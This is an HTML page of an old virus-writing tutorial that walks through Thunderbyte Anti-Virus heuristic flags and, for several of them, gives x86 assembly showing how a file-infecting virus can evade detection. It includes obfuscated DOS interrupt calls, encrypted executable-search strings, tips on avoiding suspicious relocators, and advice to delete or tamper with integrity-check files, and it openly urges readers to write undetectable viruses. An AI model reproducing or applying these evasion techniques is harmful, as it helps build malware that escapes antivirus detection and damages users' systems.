
<HTML>
<HEAD>
   <TITLE>Tutorials - Anti TBAV - K&ouml;hntarks Anti-TBAV techniques</TITLE>
   
</HEAD>
<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">

<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+2>Heuristics / Shmistics<BR>
by K&ouml;hntark</FONT></FONT></B></P></CENTER>

<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+1>A guide to Anti-Heuristics
/ Shmistics Technology</FONT></FONT></B></P></CENTER>

<PRE>
<HR WIDTH="100%"></PRE>

<UL>
<UL>
<UL>
<PRE>                            INTRO
Dear Reader:

If you have been following the Virus / Anti-virus scene you
might have stumbled upon the word &quot;Heuristics.&quot;
Heuristics is a term commonly used in artificial intelligence
programs (Expert Systems etc.).
So what does artificial intelligence have to do with software
that is not even able to catch a Vienna.Grandma.Variant.#100
virus (CARO Name?) created by a 15 year old in his spare
time?
Well, it seems that the AV marketing strategists are running
out of new technologies to sell to the ever hi-new-vapor-tech
hungry public and have decided to add artificial intelligence
to the latest Antiviral software bag of tricks.

But how intelligent these &quot;heuristics&quot; programs really are?
Is it just another vain marketing trick or is the sunrise of
artificial intelligence upon us?
Can we really have intelligent programs created by fools and
demented megalomaniacs?

I claim that heuristics AV programs are not intelligent at
all and I will prove.

First, please enter Thunderbyte Anti-Virus (TBAV), the dutch
software shareware package that has become an underground
favourite due to its liberal use of the word &quot;heuristics&quot; and
to above average good quality.

TBSCAN, TBAV's scanner is an incredibly fast program that
usually identifies a high percentage of new and unknown
viruses.
TBSCAN is the most reliable scanner to discover the not-yet-
named ditties created all around the world.

Until Now.

Enter K&ouml;hntark's &quot;Heuristics / Shmistics guide.&quot;
This informative program will show you how TBSCAN really
works, how to ridicule this program, and to beat it flag by
flag (you can think of flags as Heuristics warnings.)

Now you can be the first one in your block to write anti-
heuristics / Shmistics viruses!

The process is incredibly simple: For each Flag or heuristic
warning I have listed a BAD CODE (Example of evil, ugly code
that causes heuristics flags to go off.) and GOOD CODE
(Example of Good, Anti-Heuristics code.)

All you have to do when you have a virus that raises specific
flags in TBSCAN is:

1-Look up the specific Flag in the Heuristics / Shmistics
  guide
2-Look at the DON'T code (which corresponds more or less to
  your code)
3-Study the solution in the DO part.
4-Adapt the solution to your particular code.

And voila!, viruses free of shmistics!

With this program I have included 2 BIG examples:

A GOOD example, the first virus this side of the galaxy not to
raise ANY heuristics flags when scanned by TBSCAN.

An EVIL example: a donothing file that, as you might have
guessed does not do anything, and raises more heuristics
flags than any virus known to mankind.

I hope this information is enough to span the next generation
of anti-heuristic / shmistic viruses, to inspire virus
programmers worldwide to write and modify the trillions of
viruses used as currency by some people, and to force
the AV marketing strategists to come up with better ideas
next time.

(Shall I mention that Thunderbyte will have to rewrite its
scanner?)
enjoy!

K&ouml;hntark</PRE>
</UL>
</UL>
</UL>

<PRE>
<HR WIDTH="100%"></PRE>

<UL>
<UL>
<UL>
<UL>
<UL>
<UL>
<PRE><A NAME="terminology"></A><B>TBAV Terminology</B></PRE>
</UL>
</UL>
</UL>
</UL>
</UL>

<PRE>
                            <B>1</B>. <A HREF="#looking">Looking

</A>                            <B>2</B>. <A HREF="#checking">Checking

</A>                            <B>3.</B> <A HREF="#tracing">Tracing

</A>                            <B>4.</B> <A HREF="#scanning">Scanning

</A>                            <B>5.</B> <A HREF="#skipping">Skipping

</A>                            <B>6.</B> <A HREF="#tbavflags">Go to TBAV Flags</A></PRE>
</UL>

<PRE>
<HR WIDTH="50%"></PRE>

<PRE>        <A NAME="looking"></A>&quot;Looking&quot; means that TbScan has successfully located the entry
        point of the program in one step. The program code has been
        identified so TbScan knows where to search without the need of
        additional analysis.

        Looking will be used on most files produced by known software.</PRE>

<PRE>
<HR WIDTH="50%"></PRE>

<PRE>        <A NAME="checking"></A>&quot;Checking&quot; means that TbScan has successfully located the entry
        point of the program, and is scanning a frame of about 4Kb
        around the entry point. If the file is infected the signature
        of the virus will be in this area. &quot;Checking&quot; is a very fast
        and reliable scan algorithm.

        Checking will be used on most files that are not produced by
        known software.</PRE>

<PRE>
<HR WIDTH="50%"></PRE>

<PRE>        <A NAME="tracing"></A>&quot;Tracing&quot; means that TbScan has successfully traced a chain of
        jumps or calls while locating the entry-point of the program,
        and is scanning a frame of about 4Kb around this location. If
        the file has been infected, the signature of the virus will be
        in this area. &quot;Tracing&quot; is a fast and reliable scan algorithm.

        Tracing will be primarily used for TSR-type COM files or Turbo
        Pascal-compiled programs. Most viruses will force TbScan to use
        &quot;Tracing&quot;.</PRE>

<PRE>
<HR WIDTH="50%"></PRE>

<PRE>        <A NAME="scanning"></A>&quot;Scanning&quot; means that TbScan is scanning the entire file
        (except for the exe-header which cannot contain any viral
        code). This algorithm will be used if &quot;Looking&quot;, &quot;Checking&quot; or
        &quot;Tracing&quot; cannot be safely used. This is the case when the
        entry-point of the program contains other jumps and calls to
        code located outside the scanning frame, or when the heuristic
        analyzer found something that should be investigated more
        thoroughly.  &quot;Scanning&quot; is a slow algorithm.  Because it
        processes almost the entire file, including data areas, false
        alarms are more likely to occur.

        The &quot;Scanning&quot; algorithm will be used while scanning
        bootsectors, SYS and BIN files.</PRE>

<PRE>
<HR WIDTH="50%"></PRE>

<PRE>        <A NAME="skipping"></A>&quot;Skipping&quot; will occur with SYS and OVL files only. It simply
        means that the file will not be scanned. As there are many SYS
        files that contain no code at all (like CONFIG.SYS) it makes
        absolutely no sense to scan these files for viruses.
        The same applies to .OV? files. Many overlay files do not
        deserve to be called as such as they lack an exe-header. Such
        files cannot be invoked through DOS making them just as
        invulnerable to direct virus attacks as .TXT files are. If a
        virus is reported to have infected an .OV? file, it involved
        one of the relatively few overlay files that does contain an
        exe-header. The infection was then the result of the virus
        monitoring the DOS exec-call (function 4Bh) and infecting any
        program being invoked that way, including &quot;real&quot; overlay files.</PRE>

<PRE>
<HR WIDTH="100%"></PRE>

<UL>
<UL>
<UL>
<UL>
<UL>
<UL>
<PRE><A NAME="tbavflags"></A><B><FONT SIZE=+2>TBAV Flags</FONT></B></PRE>
</UL>
</UL>
</UL>
</UL>
</UL>

<PRE>                       # - <A HREF="#decryp">Decryptor code found
</A>                       ! - <A HREF="#invalid">Invalid program.
</A>                       1 - <A HREF="#80186">80186+ instructions.
</A>                       @ - <A HREF="#strange">Strange instructions
</A>                       ? - <A HREF="#inconsistent">Inconsistent header.
</A>                       c - <A HREF="#integrity">No integrity check
</A>                       h - <A HREF="#hidden">Hidden or System file.
</A>                       i - <A HREF="#internal">Internal overlay.
</A>                       p - <A HREF="#packed">Packed or compressed file.
</A>                       w - <A HREF="#windows">Windows or OS/2 header.
</A>                       A - <A HREF="#memory">Suspicious Memory Allocation
</A>                       B - <A HREF="#backto">Back to entry.
</A>                       C - <A HREF="#changed">File has been changed
</A>                       D - <A HREF="#directdisk">Direct disk access
</A>                       E - <A HREF="#flexible">Flexible Entry-point
</A>                       F - <A HREF="#fileaccess">Suspicious file access
</A>                       G - <A HREF="#garbage">Garbage instructions.
</A>                       J - <A HREF="#jump">Suspicious jump construct.
</A>                       K - <A HREF="#stack">Unusual stack.
</A>                       L - <A HREF="#loadtrap">Program load trap
</A>                       M - <A HREF="#resident">Memory resident code.
</A>                       N - <A HREF="#wrongname">Wrong name extension.
</A>                       O - <A HREF="#overwrite">code Overwrite.
</A>                       R - <A HREF="#relocator">Suspicious relocator
</A>                       S - <A HREF="#search">Search for executables
</A>                       T - <A HREF="#timestamp">Invalid timestamp.
</A>                       U - <A HREF="#undocumented">Undocumented system call.
</A>                       V - <A HREF="#validated">Validated program
</A>                       Y - <A HREF="#bootsector">Invalid boot sector.
</A>                       Z - <A HREF="#execom">EXE/COM determinator.</A></PRE>
</UL>

<PRE>
<HR WIDTH="100%"></PRE>

<UL>
<PRE>    <A NAME="decryp"></A><B><FONT SIZE=+1># - Decryptor code found.

</FONT></B>    The file possibly contains a self-decryption routine. Some
    copy-protected software is encrypted so this warning may appear for
    some of your files. But if this warning appears in combination
    with, for example, the &quot;T&quot; (invalid time stamp) warning, there could
    be a virus involved and TbScan assumes the file is contaminated!
    Many viruses encrypt themselves and cause this warning to be displayed.
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
    <B>BAD_CODE:

</B>    TBSCAN will trace right thru the most complicated encryption routines..
    for polymorphic viruses this flag will be set most of the times..
    including MTE and most TPE..
    The more complex the routines are the more chances your virus has
    of setting other flags such as the G (Garbage code) flag.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
    <B>GOOD_CODE:

</B>    The trick here is to use dumb encryption routines, the kind the
    virus-guide writers hate.. why? because they are common in
    commercial and shareware software programs and they are non-suspicious
    looking. The main drawback with &quot;Heuristics&quot; Scanning is the possible
    number of false positives, and using commonly used encryption routines
    makes things worse.

    This is why self appointed AV &quot;researchers&quot; had a hard time coming
    up with reliable detection methods for Trident's Polymorphic Engine,
    since it generates a lot of commonly found decryptors/encryptors.
    Also I must note that there is a couple of extremely esoteric
    encryption routines that will not be recognized by TBSCAN as
    encryptions at all!

    <A NAME="invalid"></A><B><FONT SIZE=+1>! - Invalid program.

</FONT></B>    Invalid opcode (non-8088 instructions) or out-of-range branch. The
    program has either an entry point that located outside the body of the
    file, or reveals a chain of  jumps  that can be traced to a location
    outside the program file. Another possibility is that the program
    contains invalid processor instructions. The program being checked is
    probably damaged and cannot execute in most cases. At any rate, TbScan
    avoids risk and uses the  scan  method to scan the file.

    <A NAME="80186"></A><B><FONT SIZE=+1>1 - 80186+ instructions.

</FONT></B>    The file contains instructions which cannot be executed by 8088
    processors, and require an 80186 or better processor.

    <A NAME="strange"></A><B><FONT SIZE=+1>@ - Strange instructions

</FONT></B>    The file contains instructions which are not likely to be generated by an
    assembler, but by some code generator like a polymorphic virus instead.

    <A NAME="inconsistent"></A><B><FONT SIZE=+1>? - Inconsistent header.

</FONT></B>    The program being processed has an EXE-header that does not reflect the
    actual program lay-out. Many viruses do not update the EXE-header of an
    EXE file correctly after they infect the file, so if this warning pops up
    frequently, it appears you have a problem.

    <A NAME="hidden"></A><B><FONT SIZE=+1>h - Hidden or System file.

</FONT></B>    The file has the  Hidden  or the  System  file attribute set. This means
    that the file is not visible in a DOS directory display but TbScan scans
    it anyway. If you don t know the origin and/or purpose of this file, you
    might be dealing with a  Trojan Horse  or a  joke  virus program. Copy
    such a file onto a diskette, remove it from its program environment, and
    then check if the program concerned is missing the file. If a program
    does not miss it, you not only have freed some disk space, but you might
    also have prevented a future disaster.

    <A NAME="internal"></A><B><FONT SIZE=+1>i - Internal overlay.

</FONT></B>    The program being processed has additional data or code behind the
    load-module as specified in the EXE-header of the file. The program might
    have internal overlay(s) or configuration or debug information appended
    behind the load-module of the EXE file.

    <A NAME="packed"></A><B><FONT SIZE=+1>p - Packed or compressed file.

</FONT></B>    This means that the program is packed or compressed. There are some
    utilities that can compress program files, such as  EXEPACK and PKLITE.
    If the file became infected after compression, TbScan is able to detect
    the virus. However, if the file became infected before compression, the
    virus was also compressed in the process, and a virus scanner might no
    longer be able to recognize the virus. Fortunately, this does not happen
    very often, but you should still beware! A new program might look clean,
    but can turn out to be the carrier of a compressed virus. Other files in
    your system will become infected too, and it is these infections that
    will be clearly visible to virus scanners.

    <A NAME="windows"></A><B><FONT SIZE=+1>w - Windows or OS/2 header.

</FONT></B>    The program can be or is intended to run in a Windows (or OS/2)
    environment. TbScan offers a specialized scanning method for these files.

    <A NAME="changed"></A><B><FONT SIZE=+1>C - File has been changed

</FONT></B>    This warning appears only if you use TbSetup to generate the ANTI-VIR.DAT
    files and means the file has been changed. Upgrading the software would
    trigger this message. Otherwise, it is very likely that a virus infected
    the file!
    NOTE:
         TbScan does not display this warning if only some internal
         configuration area of the file changes. This warning means that code
         at the program entry point, the entry-point itself, and/or the file
         size has been changed.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   <B>GOOD_CODE:

</B>   The only way to avoid this is to delete or modify the Anti-Vir.Dat
   file in each directory where you are infecting files to.
   The easiest method is to delete the file, to overwrite or truncate
   it, so it cannot be undeleted by a &quot;smart&quot; user.
   For perfect &quot;stealth&quot; one could modify the contents of the file,
   putting the right flag in the file-to-be-infected field describing
   it as a &quot;self-modifying&quot; file. This is more involved and requires
   unnecessary code, since the deleting of checksum files can be
   implemented as a universal attack against several integrity checking
   programs, not just TBSCAN.

   <A NAME="integrity"></A><B><FONT SIZE=+1>c - No integrity check.

</FONT></B>   This warning indicates that no checksum/recovery information has
   been found about the indicated file. It is highly recommended to
   use TbSetup in this case to store information of the mentioned
   file. This info can later be used for integrity checking and to
   recover from virus infections.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   <B>GOOD_CODE:

</B>   This is not really a flag... it won't raise any warnings by itself..
   This only means that the file ANTI-VIR.DAT wasn't found in the current
   directory you are scanning.. this is good news of course, as TBSCAN
   cannot verify any checksum information for the files...

   <A NAME="fileaccess"></A><B><FONT SIZE=+1>F - Suspicious file access.

</FONT></B>   TbScan has found instruction sequences common to infection schemes
   used by viruses. This flag will appear with those programs that
   are able to create or modify existing files.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   <B>BAD_CODE:

</B>   ;Restore date and time of file to be infected

        mov    ax,5701h
        mov    dx,WORD PTR [si + OFFSET F_DATE - OFFSET VIRUS]
        mov    cx,WORD PTR [si + OFFSET F_TIME - OFFSET VIRUS]
        int    21h

       ;Restore file attributes

        lea     dx,[si + FNAME - OFFSET VIRUS] ;get filename
        mov     cx,[si + ATTR - OFFSET VIRUS]  ;get old attributes
        mov     ax,4301h                       ;set file attributes to cx
        int     21h

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   <B>GOOD_CODE:

</B>         ;Restore date and time of file to be infected

        mov     ax,0A8FEh
        mov     dx,WORD PTR [si + F_DATE - OFFSET VIRUS]
        mov     cx,WORD PTR [si + F_TIME - OFFSET VIRUS]
        not     ax                                   ;A8FE becomes 5701
        int     21h

        ;Restore file attributes

        lea     dx,[si + OFFSET FNAME - OFFSET VIRUS] ;get filename
        mov     cx,[si + OFFSET ATTR - OFFSET VIRUS]  ;get old attributes
        mov     ax,0BCFEh
        not     ax                                    ;BCFE becomes 4301h
        int     21h

   There is a million different ways of doing this, this is just an
   example

   <A NAME="relocator"></A><B><FONT SIZE=+1>R - Suspicious relocator.

</FONT></B>    Flag &quot;R&quot; refers to a suspicious relocator. A relocator is a
    sequence of instructions that changes the proportion of CS:IP. It
    is often used by viruses, especially COM type infectors. Tests on a
    large collection of viruses show that TbScan issues this flag for
    about 65% of all viruses. Those viruses have to relocate the CS:IP
    proportion because they have been compiled for a specific location
    in the executable file; a virus that infects another program can
    hardly ever use its original location in the file as it is appended
    to this file. Sound programs &quot;know&quot; their location in the
    executable file, so they don't have to relocate themselves. On
    systems that operate normally only a small percentage of the
    programs should therefore cause this flag to be displayed.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   <B>BAD_CODE:

</B>;*****************
; 1-OPEN FILE
;*****************

        lea     dx,[si + OFFSET FNAME - OFFSET VIRUS]   ;open the file
        mov     ax,3D02h                                ;r/w access to it
         int     21h
        jc      NO_GOOD                                 ;error.. quit
        xchg    ax,bx                                   ;bx = file handle

    Where do you think the problem is?
    Well, you might have read in clumsy virus writing guides of the joys
    of using indexed instructions to access the virus' data locations in
    memory to make your code fast and small. The &quot;experts&quot; use them even
    in their soup and it makes their code tight.
    Well, do you want tight code that can be recognized as a virus from
    miles away or you want real, undetectable viruses?
    If you chose the later do yourself a favour.. minimize the use of
    indexes.
    TBSCAN will set the R flag with just a few of them anywhere in your
    code.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
    <B>GOOD_CODE:

</B>        mov     bp,si                                 ;flabby, fat code
        add     bp,OFFSET FNAME - OFFSET VIRUS        ;but it unsuspicious!
         mov     dx,bp

        mov     ax,3D02h                              ;r/w access to it
        int     21h
        jc      NO_GOOD                               ;error.. quit
        xchg    ax,bx                                 ;bx = file handle

    You can apply the same solution for any code that can be indexed:

        mov     WORD PTR [si + ATTR - VIRUS],cx          ;save attributes
         cmp     BYTE PTR [si + START_CODE+3 - VIRUS],20h ;check for &quot; &quot;
         add     WORD PTR [si + LOC - VIRUS],cx
         sub     WORD PTR [si + LOC1 - VIRUS],dx
        etc..

    The strategy is the same.. it might add a lot of &quot;fat&quot; to your code,
    but a fat virus is better than a dead one.

    <A NAME="wrongname"></A><B><FONT SIZE=+1>N - Wrong name extension.

</FONT></B>    Name conflict. The program carries the extension .EXE but appears
    to be an ordinary .COM file, or it has the extension .COM but the
    internal layout of an .EXE file. TbScan does not take any risk in
    this situation, but scans the file for both EXE and COM type
    signatures. A wrong name extension might in some cases indicate a
    virus, but in most cases it doesn't.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
    <B>BAD_CODE:

</B>    This will occur in extremely buggy viruses that cannot distinguish
    EXE files from COMs or in stupid overwriting viruses.
    There is also a couple of DOS 5.0 files, specifically DISK.COM that
    have a EXE header, so special care must be taken in not raising extra
    flags since any possible host may have heuristic flags of its own, so
    any heuristic flags added by the virus will just make the file more
    suspicious.

   <FONT SIZE=+1> <A NAME="search"></A><B>S - Search for executables.

</B></FONT>    The program searches for *.COM or *.EXE files. This by itself does
    not indicate a virus, but it is an ingredient of most viruses
    anyway (they have to search for suitable files to spread themselves).
    If accompanied by other flags, TbScan will assume the file is infected
    by a virus.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   <B>BAD_CODE:

</B>   The following code (even by itself!) is enough to set this flag:

        db      '*.COM'
        db      '*.EXE'

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
   <B>GOOD_CODE:

</B>   To get around this use what I call &quot;point-encryption routine&quot; to
   make the strings into something not recognizable.. (Also, see the
   Z flag)

        mov     bp,OFFSET COM_FILES     ;decrypt *.COM string
        call    POINT_ENCRYPT
        add     bp,02
        call    POINT_ENCRYPT

        lea     dx,[si + OFFSET COM_FILES - OFFSET VIRUS ] ;dont use this..
                                                            ;see R flag
        mov     ax,04E00h     ;mov ah,4eh, =&gt; DOS search 1st file function
        mov     cx,3fh        ;search for any file, with any attributes
        int     21H
        etc..

   POINT_ENCRYPT:

        push    bp                    ;save bp to do dword encryptions
         etc.

         add     bp,si
        sub     bp,OFFSET VIRUS       ;the entry point of the virus is on si
        xor     WORD PTR [bp],ID2
        pop     bp                    ;restore bp
        ret                           ;return to caller

   COM_FILES
        db      5Dh,59h,34h,38h,'M',0     ;encrypted *.COM,0

        ID2     equ 7777h                 ;(used in POINT_ENCRYPT)

   This is just one (and rather inefficient) way of doing this...
   there are a million other ways... this is just to give you an idea.
   For a more efficient way look in the example virus.

    <A NAME="memory"></A><B><FONT SIZE=+1>A - Suspicious Memory Allocation

</FONT></B>    The program uses a non-standard way to search for, and/or to allocate
    memory. Many viruses try to hide themselves in memory, so they use a
    non-standard way to allocate this memory. Some programs (such as
    high-loaders or diagnostic software) also use non-standard ways to search
    or allocate memory.

    <A NAME="backto"></A><B><FONT SIZE=+1>B - Back to entry.

</FONT></B>    The program seems to execute some code, and after that jumps back to the
    entry-point of the program. Normally this results in an endless loop,
    except when the program also modifies some of its instructions. This is
    quite common behavior for computer viruses. In combination with any other
    flag, TbScan reports a virus.

    <A NAME="directdisk"></A><B><FONT SIZE=+1>D - Direct disk access

</FONT></B>    This flag appears if the program being processed has instructions near
    the entry-point to write to a disk directly. It is quite normal that some
    disk related utilities trigger this flag.  If several files that should
    not be  writing directly to the disk trigger this flag, your system might
    be infected by an unknown virus.
    NOTE:
         A program that accesses the disk directly does not always have the
         &quot;D&quot; flag. Only when the direct disk instructions are near the
         program entry point does TbScan report it. If a virus is at fault,
         the harmful instructions are always near the entry point, so it is
         only there that TbScan looks for them.

    <A NAME="flexible"></A><B><FONT SIZE=+1>E - Flexible Entry-point

</FONT></B>    This flag indicates that the program starts with a routine that
    determines its location within the program file. This is rather
    suspicious because sound programs have a fixed entry-point so they do not
    have to determine this location. For viruses, however, this is quite
    common. Approximately 50% of the known viruses trigger this flag.

    <A NAME="garbage"></A><B><FONT SIZE=+1>G - Garbage instructions.

</FONT></B>    The program contains code that seems to have no purpose other than
    encryption or avoiding recognition by virus scanners. In most cases there
    won't be any other flag since the file is encrypted and the instructions
    are hidden.
    NOTE:
         This flag appears occasionally on &quot;normal&quot; files. This simply
         indicates, however, that these are poorly designed, not infected..

    <A NAME="jump"></A><B><FONT SIZE=+1>J - Suspicious jump construct.

</FONT></B>    The program did not start at the program entry point. The code has either
    jumped at least twice before reaching the final startup code, or the
    program jumped using an indirect operand. Sound programs should not
    display this kind of strange behavior. If several files trigger this
    flag, you should investigate your system thoroughly.

    <A NAME="stack"></A><B><FONT SIZE=+1>K - Unusual stack.

</FONT></B>    The EXE file being processed has an odd (instead of even) stack offset or
    a suspicious stack segment. Many viruses are quite  buggy  by setting up
    an illegal stack value.

    <A NAME="loadtrap"></A><B><FONT SIZE=+1>L - Program load trap

</FONT></B>    The program might trap the execution of other software. If the file also
    triggers the &quot;M&quot; flag (memory resident code), it is very likely that the
    file is a resident program that determines when another program executes.
    Many viruses trap the program load and use it to infect the program. Some
    anti-virus utilities also trap the program load.

    <A NAME="resident"></A><B><FONT SIZE=+1>M - Memory resident code.

</FONT></B>    TbScan has found instruction sequences that could cause the program to
    hook into important interrupts. Many TSR (Terminate and Stay Resident)
    programs trigger this flag because hooking into interrupts is part of
    their usual behavior. If several non-TSR programs trigger this warning
    flag, however, you should be suspicious. It is likely that a virus that
    remains resident in memory infected your files.
    NOTE:
         This warning does not appear with all true TSR programs, nor can you
         always rely upon  TSR detection in non-TSR programs.

    <A NAME="overwrite"></A><B><FONT SIZE=+1>O - code Overwrite.

</FONT></B>    This flag appears if TbScan detects that the program overwrites some of
    its instructions. However, it does not seem to have a complete
    (de)cryptor routine.

    <A NAME="timestamp"></A><B><FONT SIZE=+1>T - Invalid timestamp.

</FONT></B>    The timestamp of the program is invalid; that is, the number of seconds
    in the time stamp is illegal, or the date is illegal or later than the
    year 2000. This is suspicious because many viruses set the time stamp to
    an illegal value (such as 62 seconds) to mark that they already infected
    the file so they won't infect a file a second time. It is possible that
    the program being checked is contaminated with a virus that is still
    unknown, especially if several files on your system have an invalid time
    stamp. If only very few programs have an invalid time stamp, you d better
    correct it and scan frequently to check that the time stamp of the files
    remains valid.

    <A NAME="undocumented"></A><B><FONT SIZE=+1>U - Undocumented system call.

</FONT></B>    The program uses unknown DOS calls or interrupts. These unknown calls can
    be issued to invoke undocumented DOS features, or to communicate with an
    unknown driver in memory. Since many viruses use undocumented DOS
    features, or communicate with memory resident parts of a previously
    loaded instance of the virus, a program is suspicious if it performs
    unknown or undocumented communications. This does not necessarily
    indicate a virus, however, since some  tricky  programs also use
    undocumented features.

    <A NAME="validated"></A><B><FONT SIZE=+1>V - Validated program

</FONT></B>    The program has been validated to avoid false alarms. The design of this
    program would normally cause a false alarm by the heuristic scan mode of
    TbScan, or this program might change frequently, and TbScan excludes the
    file from integrity checking. Either TbSetup (automatically) or by TbScan
    (manually) stores these exclusions in the ANTI-VIR.DAT.

    <A NAME="bootsector"></A><B><FONT SIZE=+1>Y - Invalid boot sector.

</FONT></B>    The boot sector is not completely according to the IBM defined boot
    sector format. It is possible that the boot sector contains a virus or
    has been corrupted.

    <A NAME="execom"></A><B><FONT SIZE=+1>Z - EXE/COM determinator.

</FONT></B>    The program seems to check whether a file is a COM or EXE type program.
    Infecting a COM file is a process that is not similar to infecting an EXE
    file, which implies that viruses able to infect both program types should
    also be able to distinguish between them. There are, of course, innocent
    programs that need to find out whether a file is a COM or EXE file.
    Executable file compressors, EXE2COM, converters, debuggers, and
    high-loaders are examples of programs that might contain a routine to
    distinguish between EXE and COM files.</PRE>
</UL>

<PRE>
<HR WIDTH="100%">
</PRE>

</BODY>
</HTML>
